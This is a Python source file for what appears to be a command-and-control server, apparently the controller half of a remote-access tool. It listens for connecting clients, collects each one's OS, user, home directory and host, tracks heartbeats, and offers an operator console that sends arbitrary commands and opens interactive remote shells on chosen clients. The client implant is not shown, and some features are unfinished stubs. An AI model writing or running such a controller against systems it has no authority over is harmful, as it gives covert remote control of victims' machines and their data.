import json
import os
import platform
import socket
import subprocess
import sys
import threading
import time
import uuid

defaultInterface='127.0.0.1'
defaultPort=9999

connectionMap=[]
handlerMap=[]

'''
Data layout:

handlerMap[0] - <thread>
connectionMap[0] - {
	'connection': <socket>,
	'pulse': <int>,
	'lastpulse': <unixtime>,
	'details':{
		'uuid': <string>
		'os': <string>,
		'user': <string>,
		'home': <string>,
		'host': <string>
	}
}

'''

def dumpHandlerMap():
	cleanOut=''
	for x,y in enumerate(handlerMap):
		cleanOut+='['+str(x)+'] - '+str(y)+"\n"
	
	return(cleanOut)
	
def dumpConnectionMap():
	cleanOut=''
	for x,y in enumerate(connectionMap):
		cleanOut+='['+str(x)+'] - '+str(y)+"\n"
	
	return(cleanOut)

def consoleControl():
	sockState='open'
	sockClientLock=-1
	
	nextOutput="[>]\tlistener established on "+defaultInterface+":"+str(defaultPort)
	while(True):
		print("\033c")
		print("==========\n\tcontroller online. help - list - query - send - shell - quit\n==========\n")
		print(nextOutput+"\n\n")
		rawCommand=input("> ")
		segCommand=(rawCommand+'     ').split(' ')
		
		match(sockState):
			case 'lock':
				nextOutput="[>]\tshell open: "+str(connectionMap[sockClientLock]['connection'])+" ("+str(sockClientLock)+"). exit to close shell.\n[>] last command: "+rawCommand
				
				if(rawCommand=='exit'):
					nextOutput="[>]\tshell closed. regular commands available again."
					sendClientData('$end-shell',sockClientLock)
					sockState='open'
					sockClientLock=-1
				else:
					sendClientData(rawCommand,sockClientLock)
			case _:
				match(segCommand[0]):
					case 'help':
						nextOutput="[>]\thelp text goes here"
					case 'list':
						if(segCommand[1]=='threads'):
							nextOutput=dumpHandlerMap()
						elif(segCommand[1]=='socks'):
							nextOutput=dumpConnectionMap()
						elif(segCommand[1]=='all'):	
							nextOutput=dumpHandlerMap()
							nextOutput+=dumpConnectionMap()
						else:
							nextOutput="[>]\tlist [threads|socks|all] [optional id]"
						
					case 'query':
						True

					case 'send':
						try:
							x=int(segCommand[1])
						except:
							x=9999

						if(x<len(connectionMap)):
							rawCommand=''
							for x in segCommand[2::]:
								rawCommand+=' '+x
							nextOutput="[>]\tsocket ["+segCommand[1]+"] >>> "+rawCommand.rstrip()+"..."
							sendClientData(rawCommand.rstrip(),int(segCommand[1]))
						elif(x==9999):
							nextOutput="[>]\tsend [sock_id] [message]"
						else:
							nextOutput="[x]\tsocket ["+segCommand[1]+"] >>> "+rawCommand.rstrip()+" FAILED: NO SUCH SOCKET"

					case 'shell':
						try:
							x=int(segCommand[1])
						except:
							x=9999

						if(x<len(connectionMap)):
							sockState='lock'
							sockClient=int(segCommand[1])
							sendClientData('$req-shell',int(segCommand[1]))
							nextOutput="[>]\tshell open: "+str(connectionMap[int(segCommand[1])]['connection'])+" ("+segCommand[1]+"). exit to close shell."

					case 'quit':
						print("[>]\texiting...")
						os._exit(0)

def sendClientData(clientData,clientIndex):
	connectionMap[clientIndex]['connection'].send(clientData.encode())
	
def listenServer(hostInterface,hostPort):
	global lastClient
	sockServer=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sockServer.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	sockServer.bind((hostInterface, hostPort))
	sockServer.listen(5)
	
	while True:
		clientHandle, clientAddress = sockServer.accept()
		threadHandler=threading.Thread(target=handleConnection, args=(clientHandle,clientAddress,))
		threadHandler.start()
		handlerMap.append(threadHandler)

def processClientData(clientData,clientIndex):
	
	if(clientData.find('$hb')>(-1)):
		heartBeat=clientData.split(' ')[1]
		connectionMap[clientIndex].update({'pulse':int(heartBeat),'lastpulse':time.time()})
	elif(clientData.find('$ack-shell')>(-1)):
		print("\n\n[>]",clientData[10:])
	
def handleConnection(clientHandle,clientAddress):
	thisIndex=0
	sockState=''
	clientHandle.send('$req-ident'.encode())
	sockState='$req-ident'

	sockBuffer=clientHandle.recv(2048).decode()
	while(sockBuffer):
		match sockState:
			case '$req-ident':
				thisConnection={
					'connection':clientHandle,
					'pulse':0,
					'lastpulse':0,
					'details':json.loads(sockBuffer)
				}
				connectionMap.append(thisConnection)
				thisIndex=len(connectionMap)-1
				clientHandle.send('ack-ident'.encode())
				sockState=''
			case _:
				processClientData(sockBuffer,thisIndex)
		sockBuffer=clientHandle.recv(2048).decode()
			
print("[i]\tattempting to listen on",defaultInterface+":"+str(defaultPort))	

threadListener=threading.Thread(target=listenServer,args=(defaultInterface,defaultPort,))
threadListener.start()

consoleControl()
